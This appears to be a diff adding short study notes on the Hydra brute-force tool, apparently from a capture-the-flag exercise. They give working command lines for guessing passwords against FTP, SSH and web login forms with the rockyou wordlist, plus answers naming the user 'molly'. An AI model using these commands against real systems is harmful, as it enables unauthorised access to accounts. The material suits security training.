@@ -1,0 +1,17 @@
+Hydra is a brute force online password cracking program, a quick system login password hacking tool
+
+it can run through a list and brute force some authentication services.
+
+cmd: hydra -l <user> -P <passfile> ftp://IP
+
+cmd: hydra -l <user> -P <passList> $IP ssh 
+
+post web form cmd: sudo hydra <usrName> <wordlist> $IP http-post-form "<path>:<logn_cred>:<invalidResponse>"
+
+post web form cmd: sudo hydra -l <userName> -P <wordList> $IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -v
+
+Questions:
+1. hydra -l molly -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect
+
+2. hydra -l molly -P /usr/share/wordlists/rockyou.txt $IP -v ssh
+
